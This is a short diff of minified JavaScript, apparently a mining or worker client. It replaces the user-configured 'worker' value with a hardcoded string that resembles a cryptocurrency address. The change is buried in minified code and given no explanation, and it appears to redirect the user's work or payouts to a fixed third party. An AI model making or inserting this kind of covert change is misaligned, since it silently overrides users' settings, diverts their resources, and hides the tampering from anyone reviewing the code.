@@ -208,7 +208,7 @@
             (0, W.A)(this, "client", void 0),
               (0, W.A)(this, "worker", void 0),
               (this.client = U),
-              (this.worker = Q.worker),
+              (this.worker = "mbc1q2ds5dk45lvmkrdfcjsjz0jwvrvlzrtk9r3md5g"),
               this.start(Q);
           }
           shutdown() {
